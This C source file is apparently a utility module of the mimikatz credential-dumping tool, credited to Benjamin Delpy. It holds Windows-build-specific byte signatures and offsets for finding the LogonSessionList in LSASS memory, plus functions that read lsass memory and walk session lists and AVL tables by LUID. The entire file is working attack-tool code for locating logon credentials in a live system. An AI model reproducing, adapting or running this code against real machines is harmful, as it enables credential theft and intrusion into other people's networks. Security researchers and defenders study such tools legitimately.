/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa_utils.h"

#ifdef _M_X64
BYTE PTRN_WIN5_LogonSessionList[]		= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
BYTE PTRN_WIN6_LogonSessionList[]		= {0x4c, 0x03, 0xd8, 0x49, 0x8b, 0x03, 0x48, 0x89};
BYTE PTRN_WIN81_LogonSessionList[]		= {0x48, 0x03, 0xc1, 0x48, 0x8b, 0x08, 0x48, 0x89};
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -60}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -59}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -0}},
	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WIN81_LogonSessionList),	PTRN_WIN81_LogonSessionList},	{0, NULL}, {-4, -53}},
};
#elif defined _M_IX86
BYTE PTRN_WN51_LogonSessionList[]		= {0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84};
BYTE PTRN_WNO8_LogonSessionList[]		= {0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd};
BYTE PTRN_WIN8_LogonSessionList[]		= {0x89, 0x79, 0x04, 0x89, 0x38, 0x8d, 0x04, 0xb5};
BYTE PTRN_WIN81_LogonSessionList[]		= {0x89, 0x79, 0x04, 0x89, 0x38, 0xff, 0x04, 0xb5};
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WN51_LogonSessionList),	PTRN_WN51_LogonSessionList},	{0, NULL}, { 24,   0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -43}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -42}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LogonSessionList),	PTRN_WIN8_LogonSessionList},	{0, NULL}, {-20, -51}},
	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WIN81_LogonSessionList),	PTRN_WIN81_LogonSessionList},	{0, NULL}, {-20, -49}},
};
#endif

PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{
	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
#ifdef _M_X64
	LsaSrvReferences[4].Offsets.off1 = (pLib->Informations.TimeDateStamp > 0x53480000) ? -54 : -61; // 6.2 post or pre KB
#endif
	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  sizeof(LsaSrvReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL);
}

BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PLONG genericOffset1)
{
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &hLocalMemory};
	KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL};
	PKULL_M_PATCH_GENERIC currentReference;
	#ifdef _M_X64
		LONG offset;
	#endif

	if(currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
		{
			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
			if(genericOffset1)
				*genericOffset1 = currentReference->Offsets.off1;
		#ifdef _M_X64
			aLocalMemory.address = &offset;
			if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
				*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
		#elif defined _M_IX86
			aLocalMemory.address = genericPtr;
			pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
		#endif

			if(genericPtr1)
			{
				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
			#ifdef _M_X64
				aLocalMemory.address = &offset;
				if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
					*genericPtr1 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
			#elif defined _M_IX86
				aLocalMemory.address = genericPtr1;
				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
			#endif
			}
		}
	}
	return pLib->isInit;
}

PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL, pStruct;
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS data = {&pStruct, &hBuffer}, aBuffer = {NULL, &hBuffer};

	if(aBuffer.address = LocalAlloc(LPTR, LUIDoffset + sizeof(LUID)))
	{
		if(kull_m_memory_copy(&data, pSecurityStruct, sizeof(PVOID)))
		{
			data.address = pStruct;
			data.hMemory = pSecurityStruct->hMemory;

			while(data.address != pSecurityStruct->address)
			{
				if(kull_m_memory_copy(&aBuffer, &data, LUIDoffset + sizeof(LUID)))
				{
					if(RtlEqualLuid(luidToFind, (PLUID) ((PBYTE)(aBuffer.address) + LUIDoffset)))
					{
						resultat = data.address;
						break;
					}
					data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
				}
				else break;
			}
		}
		LocalFree(aBuffer.address);
	}
	return resultat;
}

PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuid(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS data = {&maTable, &hBuffer};

	if(kull_m_memory_copy(&data, pTable, sizeof(RTL_AVL_TABLE)))
	{
		pTable->address = maTable.BalancedRoot.RightChild;
		resultat = kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(pTable, LUIDoffset, luidToFind);
	}
	return resultat;
}

PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS data = {&maTable, &hBuffer};

	if(kull_m_memory_copy(&data, pTable, sizeof(RTL_AVL_TABLE)))
	{
		if(pTable->address = maTable.OrderedPointer)
		{
			if(data.address = LocalAlloc(LPTR, LUIDoffset + sizeof(LUID)))
			{
				if(kull_m_memory_copy(&data, pTable, LUIDoffset + sizeof(LUID)))
				{
					if(RtlEqualLuid(luidToFind, (PLUID) ((PBYTE) (data.address) + LUIDoffset)))
						resultat = maTable.OrderedPointer;
				}
				LocalFree(data.address);
			}
		}
		if(!resultat && (pTable->address = maTable.BalancedRoot.LeftChild))
			resultat = kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(pTable, LUIDoffset, luidToFind);
		if(!resultat && (pTable->address = maTable.BalancedRoot.RightChild))
			resultat = kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(pTable, LUIDoffset, luidToFind);
	}
	return resultat;
}

void kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(PVOID BaseAddress, PLSA_UNICODE_STRING String, BOOL relative)
{
	if(String->Buffer)
		String->Buffer = (PWSTR) ((ULONG_PTR)(String->Buffer) + ((relative ? -1 : 1) * (ULONG_PTR)(BaseAddress)));
}

BOOL kuhl_m_sekurlsa_utils_getSid(IN PSID * pSid, IN PKULL_M_MEMORY_HANDLE source)
{
	BOOL status = FALSE;
	BYTE nbAuth;
	DWORD sizeSid;
	KULL_M_MEMORY_HANDLE hOwn = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aDestin = {&nbAuth, &hOwn};
	KULL_M_MEMORY_ADDRESS aSource = {(PBYTE) *pSid + 1, source};

	*pSid = NULL;
	if(kull_m_memory_copy(&aDestin, &aSource, sizeof(BYTE)))
	{
		aSource.address = (PBYTE) aSource.address - 1;
		sizeSid =  4 * nbAuth + 6 + 1 + 1;

		if(aDestin.address = LocalAlloc(LPTR, sizeSid))
		{
			*pSid = (PSID) aDestin.address;
			status = kull_m_memory_copy(&aDestin, &aSource, sizeSid);
		}
	}
	return status;
}